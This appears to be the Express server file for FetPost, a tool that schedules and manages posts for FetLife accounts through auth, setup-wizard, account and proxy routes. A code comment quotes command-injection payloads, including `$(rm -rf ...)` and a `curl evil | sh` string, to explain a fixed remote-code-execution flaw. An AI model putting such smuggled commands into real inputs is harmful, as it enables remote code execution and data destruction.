/**
 * FetPost UI Server
 * Currently ships with FetLife enabled. The cross-platform infrastructure for Bluesky /
 * OnlyFans / Fansly / ManyVids / NiteFlirt is dormant — flip `enabled: true` in the
 * PLATFORMS map (Index.html) and add a SERVICES entry below to bring one back.
 */

import express from 'express';
import http from 'http';
import httpProxy from 'http-proxy';
import path from 'path';
import fs from 'fs';
import crypto from 'crypto';
import { fileURLToPath } from 'url';
import { execFile } from 'child_process';
import { promisify } from 'util';
import * as canva from './canva.js';
import * as google from './google-oauth.js';
import * as auth from './auth.js';
import * as serviceTokens from './service-tokens.js';

const execFileAsync = promisify(execFile);

// Run a cookie-extraction script with the accountId as a discrete argv entry — NOT
// interpolated into a shell string. The old `exec("script" "accountId")` form let an
// accountId like `$(rm -rf ...)` or `"; curl evil | sh; "` execute as shell (RCE),
// and /api/wizard/extract-cookies is reachable pre-auth. execFile with an argv array
// never invokes a shell on Linux, so the accountId can only ever be one argument.
function runCookieScript(scriptPath, accountId, opts) {
  const onWindows = process.platform === 'win32';
  // On Windows a .cmd/.bat needs a shell to be executable; argv is still passed
  // as a real array so there's no string-splitting of the accountId there either.
  return execFileAsync(scriptPath, [accountId], { ...opts, shell: onWindows });
}
const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();
const PORT = 4000;

app.use(express.json({ limit: '50mb' }));

const SERVICES = {
  fetlife: { url: 'http://127.0.0.1:3747', secret: process.env.FL_SERVICE_SECRET },
};

// Cookie script paths for each platform
// Cookie-extraction scripts are resolved relative to this file (so the package works from
// any install location) and per-OS (.cmd on Windows, .sh on Linux/macOS).
const COOKIE_EXT = process.platform === 'win32' ? 'cmd' : 'sh';
const COOKIE_SCRIPTS = {
  fetlife: path.resolve(__dirname, '..', '..', 'fetlife-poster', `start-cookies.${COOKIE_EXT}`),
};

const DATA_DIR = path.resolve(__dirname, '..', 'data');
const WIZARD_FILE = path.join(DATA_DIR, 'wizard.json');

function ensureDataDir() {
  try { fs.mkdirSync(DATA_DIR, { recursive: true }); } catch {}
}

// ── Wizard state ─────────────────────────────────────────────────────────────
function readWizard() {
  try { return JSON.parse(fs.readFileSync(WIZARD_FILE, 'utf8')); } catch {
    return {
      completed: false,
      step: 1,
      adminPasswordSet: false,
      licenseValidated: false,
      firstAccountAdded: false,
      cookiesCaptured: false,
      startedAt: new Date().toISOString(),
      completedAt: null,
    };
  }
}

function writeWizard(state) {
  ensureDataDir();
  fs.writeFileSync(WIZARD_FILE, JSON.stringify(state, null, 2), 'utf8');
}

// Guards every wizard-mutating endpoint. Once the wizard is marked complete, those
// endpoints all 410-Gone — they can't be used to re-set the admin password or sneak in
// without auth. Re-running the wizard requires deleting data/wizard.json on the server.
function requireWizardActive(req, res, next) {
  const state = readWizard();
  if (state.completed) return res.status(410).json({ error: 'Setup wizard already completed' });
  next();
}

// ── Auth ──────────────────────────────────────────────────────────────────────

const { requireAuth, requireEditor, requireAdmin, requireAccountAccess, requireScope, canAccessAccount } = auth;

// Enforce per-account scope on a post-by-id route. The /api/posts/:platform/:postId
// routes key off postId, not accountId, so requireAccountAccess can't gate them —
// without this an editor scoped to account A could edit/delete/retry a post owned by
// account B. Admins (and the whole single-operator case) short-circuit to true.
// Returns true when allowed; otherwise sends the response and returns false.
async function assertPostAccess(req, res, platform, postId) {
  if (req.user && req.user.role === 'admin') return true;
  let list;
  try {
    list = await proxyRequest(platform, 'GET', '/posts');
  } catch (err) {
    res.status(502).json({ error: 'Could not verify post ownership: ' + err.message });
    return false;
  }
  const posts = list && list.data && Array.isArray(list.data.posts) ? list.data.posts : null;
  if (list.status >= 400 || !posts) {
    res.status(502).json({ error: 'Could not verify post ownership' });
    return false;
  }
  const post = posts.find(p => p.postId === postId || p.id === postId);
  if (!post) { res.status(404).json({ error: 'Post not found' }); return false; }
  if (!canAccessAccount(req.user, post.accountId)) {
    res.status(403).json({ error: 'Access denied to this account' });
    return false;
  }
  return true;
}

app.post('/api/login', async (req, res) => {
  const { username, password } = req.body || {};
  if (!username || !password) {
    return res.status(400).json({ error: 'username and password required' });
  }
  try {
    const result = await auth.login(username, password);
    if (!result) return res.status(401).json({ error: 'Invalid username or password' });
    res.json({
      success: true,
      token: result.token,
      user: result.user,
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post('/api/auth/logout', requireAuth, async (req, res) => {
  try {
    await auth.logout(req.headers['x-ui-token']);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get('/api/auth/whoami', requireAuth, (req, res) => {
  res.json({ user: req.user });
});

// Forgot-password — issues a single-use reset token and emails the link via Resend.
// Always returns 200 so attackers can't enumerate which emails exist.
// If RESEND_API_KEY is unset, logs the link to stdout instead (dev fallback + backstop
// the operator can read from journalctl if email is misconfigured).
async function sendResetEmail(toEmail, toName, resetUrl) {
  const apiKey = process.env.RESEND_API_KEY;
  if (!apiKey) {
    console.log(`[fetpost-ui] password reset link for ${toName} <${toEmail}>: ${resetUrl}`);
    return { stubbed: true };
  }
  const from = process.env.RESEND_FROM || 'FetPost <noreply@fetpost.com>';
  const r = await fetch('https://api.resend.com/emails', {
    method: 'POST',
    headers: { Authorization: 'Bearer ' + apiKey, 'Content-Type': 'application/json' },
    body: JSON.stringify({
      from,
      to: [toEmail],
      subject: 'Reset your FetPost password',
      text: `Hi ${toName},\n\nUse this link to set a new password for your FetPost account:\n\n${resetUrl}\n\nThe link expires in 1 hour and can only be used once. If you didn't request this, you can ignore this email.\n\n— FetPost`,
      html: `<p>Hi ${toName},</p><p>Use this link to set a new password for your FetPost account:</p><p><a href="${resetUrl}">${resetUrl}</a></p><p style="color:#888;font-size:13px">The link expires in 1 hour and can only be used once. If you didn't request this, you can ignore this email.</p><p>— FetPost</p>`,
    }),
  });
  if (!r.ok) {
    const body = await r.text().catch(() => '');
    throw new Error('Resend ' + r.status + ': ' + body.slice(0, 200));
  }
  const result = await r.json();
  console.log(`[fetpost-ui] reset email sent to <${toEmail}> via Resend (id=${result.id || '?'})`);
  return result;
}

app.post('/api/auth/forgot-password', async (req, res) => {
  const { email } = req.body || {};
  if (!email || typeof email !== 'string') {
    return res.status(400).json({ error: 'email required' });
  }
  try {
    const issued = await auth.issuePasswordResetToken(email);
    if (issued) {
      const base = process.env.PUBLIC_URL || 'http://127.0.0.1:4000';
      const url = base.replace(/\/$/, '') + '/?reset=' + encodeURIComponent(issued.rawToken);
      const target = issued.user.email || email;
      try {
        await sendResetEmail(target, issued.user.displayName || issued.user.username, url);
      } catch (sendErr) {
        // Log so the operator can relay the link by hand if email is broken.
        console.error(`[fetpost-ui] reset email send failed for ${target}: ${sendErr.message}. Link: ${url}`);
      }
    }
    res.json({ success: true });
  } catch (err) {
    console.error('[fetpost-ui] forgot-password error:', err.message);
    res.json({ success: true });
  }
});

app.post('/api/auth/reset-password', async (req, res) => {
  const { token: rawToken, newPassword } = req.body || {};
  if (!rawToken || !newPassword) {
    return res.status(400).json({ error: 'token and newPassword required' });
  }
  try {
    const user = await auth.consumePasswordResetToken(rawToken, newPassword);
    res.json({ success: true, username: user.username });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

app.post('/api/auth/change-password', requireAuth, async (req, res) => {
  const { currentPassword, newPassword } = req.body || {};
  if (!currentPassword || !newPassword) {
    return res.status(400).json({ error: 'currentPassword and newPassword required' });
  }
  try {
    await auth.changeOwnPassword(req.user.id, currentPassword, newPassword);
    res.json({ success: true });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

// ── User management (admin only) ─────────────────────────────────────────────

app.get('/api/users', requireAdmin, async (req, res) => {
  try {
    const users = await auth.listUsers();
    res.json({ users });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/users', requireAdmin, async (req, res) => {
  try {
    const user = await auth.createUser(req.body || {});
    res.json({ user });
  } catch (err) { res.status(400).json({ error: err.message }); }
});

app.patch('/api/users/:id', requireAdmin, async (req, res) => {
  try {
    const user = await auth.updateUser(req.params.id, req.body || {});
    res.json({ user });
  } catch (err) { res.status(400).json({ error: err.message }); }
});

app.delete('/api/users/:id', requireAdmin, async (req, res) => {
  try {
    if (req.params.id === req.user.id) {
      return res.status(400).json({ error: 'Cannot delete your own account' });
    }
    await auth.deleteUser(req.params.id);
    res.json({ success: true });
  } catch (err) { res.status(400).json({ error: err.message }); }
});

app.post('/api/users/:id/reset-password', requireAdmin, async (req, res) => {
  const { newPassword, mustChangePassword } = req.body || {};
  try {
    await auth.resetUserPassword(req.params.id, newPassword, {
      mustChangePassword: mustChangePassword !== false,
    });
    res.json({ success: true });
  } catch (err) { res.status(400).json({ error: err.message }); }
});

// ── Service tokens (machine-to-machine API access) ──────────────────────────

app.get('/api/auth/service-tokens', requireAdmin, async (req, res) => {
  try {
    const tokens = await serviceTokens.listTokens();
    res.json({ tokens, availableScopes: serviceTokens.SCOPES });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/auth/service-tokens', requireAdmin, async (req, res) => {
  const { name, scopes, accountIds } = req.body || {};
  try {
    const { token, record } = await serviceTokens.createToken({
      name, scopes, accountIds,
      createdByUserId: req.user.id,
    });
    // Token is returned exactly once — caller must store it now.
    res.json({ token, record });
  } catch (err) { res.status(400).json({ error: err.message }); }
});

app.post('/api/auth/service-tokens/:id/revoke', requireAdmin, async (req, res) => {
  try {
    const record = await serviceTokens.revokeToken(req.params.id, {
      revokedByUserId: req.user.id,
    });
    res.json({ record });
  } catch (err) { res.status(400).json({ error: err.message }); }
});

app.delete('/api/auth/service-tokens/:id', requireAdmin, async (req, res) => {
  try {
    await serviceTokens.deleteToken(req.params.id);
    res.json({ success: true });
  } catch (err) { res.status(400).json({ error: err.message }); }
});

// ── First-run wizard endpoints ───────────────────────────────────────────────
// All wizard endpoints are PUBLIC (no requireAuth) since the customer can't log in
// until the wizard completes. They self-gate via requireWizardActive so they can't
// be used to overwrite settings post-setup.

app.get('/api/wizard/status', (req, res) => {
  res.json(readWizard());
});

app.post('/api/wizard/set-password', requireWizardActive, async (req, res) => {
  const { password, username, displayName, email } = req.body || {};
  if (typeof password !== 'string' || password.length < 8) {
    return res.status(400).json({ error: 'Password must be at least 8 characters' });
  }
  try {
    // Idempotent: if an admin already exists (e.g. wizard re-entered after partial
    // setup), skip creation and just bump wizard state forward.
    if (!(await auth.hasAnyUsers())) {
      await auth.createFirstAdmin({ username, password, displayName, email });
    }
    const state = readWizard();
    state.adminPasswordSet = true;
    state.step = Math.max(state.step, 2);
    writeWizard(state);
    res.json({ success: true, state });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

// License validation — proxies to fetlife-poster which owns the key and validates it
// against the Cloudflare Worker before storing. The key itself lives with the poster
// (alongside credentials), not in wizard.json; we only record that the step passed.
app.post('/api/wizard/license', requireWizardActive, async (req, res) => {
  const { licenseKey } = req.body || {};
  if (typeof licenseKey !== 'string' || licenseKey.trim().length < 4) {
    return res.status(400).json({ error: 'License key looks invalid' });
  }
  try {
    const result = await proxyRequest('fetlife', 'POST', '/license/activate', { licenseKey: licenseKey.trim() });
    if (!result.ok) {
      return res.status(result.status).json({
        error: licenseErrorMessage(result.data && result.data.reason),
        reason: result.data && result.data.reason,
      });
    }
    const state = readWizard();
    state.licenseValidated = true;
    state.step = Math.max(state.step, 3);
    writeWizard(state);
    res.json({ success: true, state, unenforced: !!result.data.unenforced });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Map a Worker validation reason to friendly copy for the wizard / dashboard.
function licenseErrorMessage(reason) {
  switch (reason) {
    case 'unknown': return "We don't recognize that license key. Double-check it and try again.";
    case 'expired': return 'That license has expired. Renew it, then re-enter the key.';
    case 'revoked': return 'That license has been revoked. Contact support if you believe this is an error.';
    case 'unreachable': return "Couldn't reach the license server. Check the droplet's internet connection and try again.";
    case 'missing_key': return 'Enter your license key.';
    default: return 'That license key could not be validated.';
  }
}

// Forwards account creation to the existing fetlife-poster /accounts endpoint, then
// marks the wizard step done. The cookie-capture sub-step happens separately.
app.post('/api/wizard/account', requireWizardActive, async (req, res) => {
  const { accountId, username, password, groupName, accountType } = req.body || {};
  if (!accountId || !username || !password) {
    return res.status(400).json({ error: 'accountId, username, password are required' });
  }
  try {
    const result = await proxyRequest('fetlife', 'POST', '/accounts', {
      accountId, username, password,
      groupName: groupName || accountId,
      accountType: accountType || 'organization',
    });
    if (!result.ok) return res.status(result.status).json(result.data);
    const state = readWizard();
    state.firstAccountAdded = true;
    state.step = Math.max(state.step, 4);
    writeWizard(state);
    res.json({ success: true, state, account: result.data });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Wizard-mode cookie capture: same script as /api/accounts/:platform/:accountId/extract-cookies
// but exposed pre-auth (gated by requireWizardActive) since the customer can't log in yet.
// Spawns the headed-Chrome cookie extractor which paints into the VNC desktop; the noVNC
// client in the browser then connects to that desktop via /api/vnc-ws.
app.post('/api/wizard/extract-cookies', requireWizardActive, async (req, res) => {
  const { accountId } = req.body || {};
  if (!accountId || typeof accountId !== 'string') return res.status(400).json({ error: 'accountId required' });
  const scriptPath = COOKIE_SCRIPTS.fetlife;
  if (!scriptPath) return res.status(400).json({ error: 'No cookie script for fetlife' });
  req.setTimeout(8 * 60 * 1000);
  res.setTimeout(8 * 60 * 1000);
  const env = { ...process.env, FETPOST_FORCE_HEADED: '1' };
  try {
    await runCookieScript(scriptPath, accountId, { maxBuffer: 10 * 1024 * 1024, timeout: 8 * 60 * 1000, env });
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Wizard-mode "I've finished logging in" signal. Mirrors /api/cookie-signal but pre-auth.
app.post('/api/wizard/cookie-signal', requireWizardActive, async (req, res) => {
  try {
    fs.writeFileSync('/tmp/fetpost-cookie-signal', new Date().toISOString());
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Marks cookie capture done — the wizard's "I've captured cookies" button. The actual
// capture happens via /api/wizard/extract-cookies (above) which spawns the headed-Chrome
// flow that the noVNC client in the browser drives.
app.post('/api/wizard/cookies-captured', requireWizardActive, async (req, res) => {
  const state = readWizard();
  state.cookiesCaptured = true;
  state.step = Math.max(state.step, 5);
  writeWizard(state);
  // Now that cookies exist, seed events for every fetlife account the wizard set up so
  // the calendar lands populated when the customer first logs in. Fire-and-forget.
  try {
    const list = await proxyRequest('fetlife', 'GET', '/accounts');
    if (list.ok) {
      for (const a of (list.data.accounts || [])) seedFetlifeEventsAsync(a.accountId);
    }
  } catch { /* non-fatal */ }
  res.json({ success: true, state });
});

app.post('/api/wizard/complete', requireWizardActive, (req, res) => {
  const state = readWizard();
  if (!state.adminPasswordSet) return res.status(400).json({ error: 'Set an admin password first' });
  state.completed = true;
  state.step = 99;
  state.completedAt = new Date().toISOString();
  writeWizard(state);
  res.json({ success: true, state });
});

async function proxyRequest(serviceKey, method, reqPath, body) {
  const service = SERVICES[serviceKey];
  if (!service) throw new Error('Unknown service: ' + serviceKey);
  const opts = { method, headers: { 'Content-Type': 'application/json', 'x-service-token': service.secret } };
  if (body) opts.body = JSON.stringify(body);
  const res = await fetch(service.url + reqPath, opts);
  const data = await res.json();
  return { ok: res.ok, status: res.status, data };
}

// Append ?progress=1 to a proxied path when the client requested it. Used by every
// scrape-triggering refresh endpoint so the same proxy works for both sync and progress modes.
function withProgressFlag(reqPath, req) {
  return req.query.progress === '1'
    ? reqPath + (reqPath.includes('?') ? '&' : '?') + 'progress=1'
    : reqPath;
}

// ── License (post-setup) ──────────────────────────────────────────────────────
// Authed reads for the dashboard banner + a manual re-check button after renewal.

app.get('/api/license', requireAuth, async (req, res) => {
  try {
    const result = await proxyRequest('fetlife', 'GET', '/license/state');
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/license/revalidate', requireAdmin, async (req, res) => {
  try {
    const result = await proxyRequest('fetlife', 'POST', '/license/revalidate');
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// ── Mentions (FetLife only) ───────────────────────────────────────────────────

app.get('/api/mentions/:accountId/config', requireAuth, requireAccountAccess, async (req, res) => {
  try {
    const r = await proxyRequest('fetlife', 'GET', '/mentions/' + encodeURIComponent(req.params.accountId) + '/config');
    res.status(r.status).json(r.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.put('/api/mentions/:accountId/config', requireEditor, requireAccountAccess, async (req, res) => {
  try {
    const r = await proxyRequest('fetlife', 'PUT', '/mentions/' + encodeURIComponent(req.params.accountId) + '/config', req.body);
    res.status(r.status).json(r.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.get('/api/mentions/:accountId', requireAuth, requireAccountAccess, async (req, res) => {
  try {
    const qs = new URLSearchParams(req.query).toString();
    const r = await proxyRequest('fetlife', 'GET', '/mentions/' + encodeURIComponent(req.params.accountId) + (qs ? '?' + qs : ''));
    res.status(r.status).json(r.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/mentions/:accountId/scan', requireEditor, requireAccountAccess, async (req, res) => {
  try {
    const r = await proxyRequest('fetlife', 'POST', '/mentions/' + encodeURIComponent(req.params.accountId) + '/scan', req.body);
    res.status(r.status).json(r.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/mentions/:accountId/:action(save|ignore|unset)', requireEditor, requireAccountAccess, async (req, res) => {
  try {
    const r = await proxyRequest('fetlife', 'POST', '/mentions/' + encodeURIComponent(req.params.accountId) + '/' + req.params.action, req.body);
    res.status(r.status).json(r.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// ── Venue Events (proxy to fetlife-poster) ────────────────────────────────────

app.get('/api/venue-events/:accountId/config', requireAuth, requireAccountAccess, async (req, res) => {
  try {
    const r = await proxyRequest('fetlife', 'GET', '/venue-events/' + encodeURIComponent(req.params.accountId) + '/config');
    res.status(r.status).json(r.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.put('/api/venue-events/:accountId/config', requireEditor, requireAccountAccess, async (req, res) => {
  try {
    const r = await proxyRequest('fetlife', 'PUT', '/venue-events/' + encodeURIComponent(req.params.accountId) + '/config', req.body);
    res.status(r.status).json(r.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.get('/api/venue-events/:accountId', requireAuth, requireAccountAccess, async (req, res) => {
  try {
    const qs = new URLSearchParams(req.query).toString();
    const r = await proxyRequest('fetlife', 'GET', '/venue-events/' + encodeURIComponent(req.params.accountId) + (qs ? '?' + qs : ''));
    res.status(r.status).json(r.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/venue-events/:accountId/scan', requireEditor, requireAccountAccess, async (req, res) => {
  try {
    const r = await proxyRequest('fetlife', 'POST', withProgressFlag('/venue-events/' + encodeURIComponent(req.params.accountId) + '/scan', req), req.body);
    res.status(r.status).json(r.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/venue-events/:accountId/:action(rsvp|unrsvp|dismiss|hide)', requireEditor, requireAccountAccess, async (req, res) => {
  try {
    const r = await proxyRequest('fetlife', 'POST', '/venue-events/' + encodeURIComponent(req.params.accountId) + '/' + req.params.action, req.body);
    res.status(r.status).json(r.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// ── Campaigns (festival / conference / hotel-takeover) ────────────────────
app.get('/api/campaigns/:accountId', requireAuth, requireAccountAccess, async (req, res) => {
  try {
    const r = await proxyRequest('fetlife', 'GET', '/campaigns/' + encodeURIComponent(req.params.accountId));
    res.status(r.status).json(r.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.get('/api/campaigns/:accountId/runs', requireAuth, requireAccountAccess, async (req, res) => {
  try {
    const r = await proxyRequest('fetlife', 'GET', '/campaigns/' + encodeURIComponent(req.params.accountId) + '/runs');
    res.status(r.status).json(r.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/campaigns/:accountId', requireEditor, requireAccountAccess, async (req, res) => {
  try {
    const r = await proxyRequest('fetlife', 'POST', '/campaigns/' + encodeURIComponent(req.params.accountId), req.body);
    res.status(r.status).json(r.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.put('/api/campaigns/:accountId/:campaignId', requireEditor, requireAccountAccess, async (req, res) => {
  try {
    const r = await proxyRequest('fetlife', 'PUT', '/campaigns/' + encodeURIComponent(req.params.accountId) + '/' + encodeURIComponent(req.params.campaignId), req.body);
    res.status(r.status).json(r.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.delete('/api/campaigns/:accountId/:campaignId', requireEditor, requireAccountAccess, async (req, res) => {
  try {
    const r = await proxyRequest('fetlife', 'DELETE', '/campaigns/' + encodeURIComponent(req.params.accountId) + '/' + encodeURIComponent(req.params.campaignId));
    res.status(r.status).json(r.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/campaigns/:accountId/:campaignId/preview', requireEditor, requireAccountAccess, async (req, res) => {
  try {
    const r = await proxyRequest('fetlife', 'POST', '/campaigns/' + encodeURIComponent(req.params.accountId) + '/' + encodeURIComponent(req.params.campaignId) + '/preview', req.body);
    res.status(r.status).json(r.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/campaigns/:accountId/:campaignId/activate', requireEditor, requireAccountAccess, async (req, res) => {
  try {
    const r = await proxyRequest('fetlife', 'POST', '/campaigns/' + encodeURIComponent(req.params.accountId) + '/' + encodeURIComponent(req.params.campaignId) + '/activate', req.body);
    res.status(r.status).json(r.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/campaigns/:accountId/runs/:runId/unschedule', requireEditor, requireAccountAccess, async (req, res) => {
  try {
    const r = await proxyRequest('fetlife', 'POST', '/campaigns/' + encodeURIComponent(req.params.accountId) + '/runs/' + encodeURIComponent(req.params.runId) + '/unschedule', req.body);
    res.status(r.status).json(r.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/campaigns/:accountId/:campaignId/sync-new-slots', requireEditor, requireAccountAccess, async (req, res) => {
  try {
    const r = await proxyRequest('fetlife', 'POST', '/campaigns/' + encodeURIComponent(req.params.accountId) + '/' + encodeURIComponent(req.params.campaignId) + '/sync-new-slots', req.body);
    res.status(r.status).json(r.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/campaigns/:accountId/runs/:runId/slot-in', requireEditor, requireAccountAccess, async (req, res) => {
  try {
    const r = await proxyRequest('fetlife', 'POST', '/campaigns/' + encodeURIComponent(req.params.accountId) + '/runs/' + encodeURIComponent(req.params.runId) + '/slot-in', req.body);
    res.status(r.status).json(r.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// ── Accounts ──────────────────────────────────────────────────────────────────

// Stripped account shape for bearer/service callers — drops Telegram tokens, iCal
// tokens, Discord webhooks, etc. that integrations have no business seeing.
function scrubAccountForService(a) {
  const out = {};
  for (const k of ['accountId','platform','username','groupName','displayName','accountType','addedAt','lastStatus','paused']) {
    if (a[k] !== undefined) out[k] = a[k];
  }
  return out;
}

app.get('/api/accounts', requireAuth, requireScope('accounts:read'), async (req, res) => {
  try {
    const results = await Promise.allSettled(
      Object.keys(SERVICES).map(p => proxyRequest(p, 'GET', '/accounts'))
    );
    const platforms = Object.keys(SERVICES);
    const accounts = [];
    results.forEach((r, i) => {
      const platform = platforms[i];
      const list = r.status === 'fulfilled' ? (r.value.data.accounts || []) : [];
      list.forEach(a => accounts.push(Object.assign({}, a, { platform })));
    });
    const scoped = auth.filterAccountList(req.user, accounts, 'accountId');
    const out = req.user.isServiceAccount ? scoped.map(scrubAccountForService) : scoped;
    res.json({ accounts: out });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/accounts', requireAdmin, async (req, res) => {
  const { platform, accountId, groupName, username, password, handle, appPassword, accountType } = req.body;
  if (!platform || !accountId) return res.status(400).json({ error: 'platform and accountId required' });
  try {
    let body;
    if (platform === 'bluesky') {
      if (!handle || !appPassword) return res.status(400).json({ error: 'handle and appPassword required' });
      body = { accountId, handle, appPassword, groupName };
    } else {
      if (!username || !password) return res.status(400).json({ error: 'username and password required' });
      body = { accountId, username, password, groupName, accountType };
    }
    const result = await proxyRequest(platform, 'POST', '/accounts', body);
    // Fire-and-forget seed: kick off an initial events scrape so the calendar shows the new
    // account's events without the user having to hit "↻ Refresh events" manually. Runs in
    // the background — we respond to the request immediately so adding an account stays
    // snappy. Failures are swallowed and logged; cookies might not be captured yet, and
    // that's fine (cache stays empty and the user can refresh later).
    if (result.ok && platform === 'fetlife') seedFetlifeEventsAsync(accountId);
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

function seedFetlifeEventsAsync(accountId) {
  const id = encodeURIComponent(accountId);
  proxyRequest('fetlife', 'POST', `/accounts/${id}/events/refresh`)
    .then(r => {
      if (!r.ok) console.warn(`[fetpost-ui] auto-seed events failed for ${accountId}: HTTP ${r.status}`);
      else console.log(`[fetpost-ui] auto-seeded events for ${accountId}`);
    })
    .catch(err => console.warn(`[fetpost-ui] auto-seed events failed for ${accountId}: ${err.message}`));
}

app.delete('/api/accounts/:platform/:accountId', requireAdmin, async (req, res) => {
  const { platform, accountId } = req.params;
  try {
    const result = await proxyRequest(platform, 'DELETE', '/accounts/' + encodeURIComponent(accountId));
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.put('/api/accounts/:platform/:accountId/password', requireAdmin, async (req, res) => {
  const { platform, accountId } = req.params;
  try {
    const result = await proxyRequest(platform, 'PUT', '/accounts/' + encodeURIComponent(accountId) + '/password', req.body);
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// Update mutable account fields (e.g. accountType: venue|organization|individual)
app.patch('/api/accounts/:platform/:accountId', requireEditor, requireAccountAccess, async (req, res) => {
  const { platform, accountId } = req.params;
  try {
    const result = await proxyRequest(platform, 'PATCH', '/accounts/' + encodeURIComponent(accountId), req.body);
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/accounts/:platform/:accountId/telegram/test', requireEditor, requireAccountAccess, async (req, res) => {
  const { platform, accountId } = req.params;
  try {
    const result = await proxyRequest(platform, 'POST', '/accounts/' + encodeURIComponent(accountId) + '/telegram/test', req.body);
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/accounts/:platform/:accountId/ical-token', requireEditor, requireAccountAccess, async (req, res) => {
  const { platform, accountId } = req.params;
  try {
    const result = await proxyRequest(platform, 'POST', '/accounts/' + encodeURIComponent(accountId) + '/ical-token', req.body);
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// PUBLIC iCal endpoint — no requireAuth so calendar apps (Google/Outlook/Apple)
// can subscribe without logging in. Token in the URL gates access. Forwarded
// directly (not via proxyRequest) because the response is text/calendar, not JSON.
app.get('/calendar/:accountId/:token.ics', async (req, res) => {
  try {
    const service = SERVICES.fetlife;
    // encodeURIComponent the token too — it's attacker-controlled and was being
    // interpolated raw, so a token like "..%2f..%2fadmin" could path-traverse into
    // other internal poster-service endpoints behind the service-token trust boundary.
    const url = service.url + '/calendar/' + encodeURIComponent(req.params.accountId) + '/' + encodeURIComponent(req.params.token) + '.ics';
    const upstream = await fetch(url, { headers: { 'x-service-token': service.secret } });
    const body = await upstream.text();
    res.status(upstream.status);
    res.setHeader('Content-Type', upstream.headers.get('content-type') || 'text/calendar; charset=utf-8');
    res.send(body);
  } catch (err) {
    res.status(500).send('Calendar fetch failed: ' + err.message);
  }
});

app.post('/api/accounts/:platform/:accountId/test', requireEditor, requireAccountAccess, async (req, res) => {
  const { platform, accountId } = req.params;
  try {
    const result = await proxyRequest(platform, 'POST', '/accounts/' + encodeURIComponent(accountId) + '/test');
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/accounts/:platform/:accountId/extract-cookies', requireAdmin, async (req, res) => {
  const { platform, accountId } = req.params;
  const scriptPath = COOKIE_SCRIPTS[platform];
  if (!scriptPath) return res.status(400).json({ error: 'No cookie script for ' + platform });
  const force = req.query.force === '1' || (req.body && req.body.force);
  // accountId (a route param, e.g. "Crucible Rendezvous") is passed as a discrete
  // argv entry via runCookieScript — never interpolated into a shell string.
  // Long timeout — extractor waits up to 5 minutes for the UI "I've logged in" signal.
  req.setTimeout(8 * 60 * 1000);
  res.setTimeout(8 * 60 * 1000);
  const env = { ...process.env };
  if (force) env.FETPOST_FORCE_HEADED = '1';
  try {
    await runCookieScript(scriptPath, accountId, { maxBuffer: 10 * 1024 * 1024, timeout: 8 * 60 * 1000, env });
    console.log(`[ui] Cookie extraction completed for ${platform}/${accountId}${force ? ' (forced VNC)' : ''}`);
    res.json({ success: true });
  } catch (err) {
    console.error(`[ui] Cookie extraction failed for ${platform}/${accountId}:`, err.message);
    res.status(500).json({ error: err.message });
  }
});

// User signals "I've logged in" from the UI; extractor (running headless) picks this up via the signal file.
app.post('/api/cookie-signal', requireAdmin, async (req, res) => {
  try {
    fs.writeFileSync('/tmp/fetpost-cookie-signal', new Date().toISOString());
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ── Canva integration (OAuth + design picker) ───────────────────────────────

function canvaConfigured() {
  return !!(process.env.CANVA_CLIENT_ID && process.env.CANVA_CLIENT_SECRET && process.env.CANVA_REDIRECT_URI);
}

app.get('/api/canva/status', requireAdmin, async (req, res) => {
  try {
    res.json({
      configured: canvaConfigured(),
      connected: canvaConfigured() ? await canva.isConnected() : false,
    });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

